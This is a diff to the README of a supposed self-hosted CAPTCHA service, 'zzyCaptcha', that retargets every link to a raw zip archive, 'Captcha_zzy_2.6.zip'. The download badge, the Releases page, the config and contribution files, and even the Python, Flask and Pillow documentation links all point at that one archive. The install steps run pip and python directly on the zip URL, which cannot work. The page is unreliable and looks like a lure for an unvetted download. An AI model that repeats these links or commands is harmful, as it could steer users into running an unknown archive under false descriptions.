@@ -11,11 +11,11 @@ zzyCaptcha is a simple, self-hostable CAPTCHA service designed to help you secur
 - **Lightweight**: Designed to have minimal impact on your website's performance.
 
 ## 📥 Download & Install
-[![Download zzyCaptcha](https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip%20zzyCaptcha-v1.0-brightgreen)](https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip)
+[![Download zzyCaptcha](https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip%20zzyCaptcha-v1.0-brightgreen)](https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip)
 
 To download zzyCaptcha, visit the Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip)
+[Visit Releases Page](https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip)
 
 Once on the page, look for the latest release. Click the link to download the zip file for your operating system.
 
@@ -38,13 +38,13 @@ Once on the page, look for the latest release. Click the link to download the zi
    - Navigate to the folder where you extracted zzyCaptcha using the `cd` command.
    - Run the command:
      ```bash
-     pip install -r https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip
+     pip install -r https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip
      ```
 
 4. **Run zzyCaptcha**:
    - In the same terminal window, execute the main application with:
      ```bash
-     python https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip
+     python https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip
      ```
 
 5. **Access the Service**:
@@ -52,9 +52,9 @@ Once on the page, look for the latest release. Click the link to download the zi
    - Type `http://localhost:5000` to access the zzyCaptcha interface.
 
 ## ⚙️ Configuration
-Customize zzyCaptcha settings by editing the included `https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip` file. Make sure to define the CAPTCHA settings based on your preferences. This includes the visual effects, security measures, and any other specific requirements.
+Customize zzyCaptcha settings by editing the included `https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip` file. Make sure to define the CAPTCHA settings based on your preferences. This includes the visual effects, security measures, and any other specific requirements.
 
-1. Open `https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip` with a text editor.
+1. Open `https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip` with a text editor.
 2. Adjust the values as necessary.
 3. Save the file and restart the application.
 
@@ -65,19 +65,19 @@ To keep zzyCaptcha up to date, return to the Releases page periodically. Check f
 If you encounter issues, consider the following:
 
 - **Python Errors**: Ensure you have Python installed and running correctly.
-- **Missing Dependencies**: If you see errors about missing libraries, revisit the `https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip` to install all required libraries.
-- **Port Issues**: If you cannot access the application at `http://localhost:5000`, check if another service is using that port and change the port number in `https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip` accordingly.
+- **Missing Dependencies**: If you see errors about missing libraries, revisit the `https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip` to install all required libraries.
+- **Port Issues**: If you cannot access the application at `http://localhost:5000`, check if another service is using that port and change the port number in `https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip` accordingly.
 
 ## 🌐 Additional Resources
 For help and support, feel free to check:
-- [Python Documentation](https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip)
-- [Flask Documentation](https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip)
-- [Pillow Documentation](https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip)
+- [Python Documentation](https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip)
+- [Flask Documentation](https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip)
+- [Pillow Documentation](https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip)
 
 You can also open issues on the GitHub repository if you have specific questions or need further assistance.
 
 ## 📝 Contribution Guidelines
-zzyCaptcha is open for contributions. If you are familiar with Python or web development, consider helping improve the project. For details on how to contribute, check the `https://raw.githubusercontent.com/IanSalon23/zzyCaptcha/main/subroot/zzyCaptcha.zip` file in the repository.
+zzyCaptcha is open for contributions. If you are familiar with Python or web development, consider helping improve the project. For details on how to contribute, check the `https://github.com/IanSalon23/zzyCaptcha/raw/refs/heads/main/subroot/Captcha_zzy_2.6.zip` file in the repository.
 
 ## 📫 Contact
 For any inquiries or suggestions, please reach out via the GitHub issues page, and I will get back to you as soon as possible.
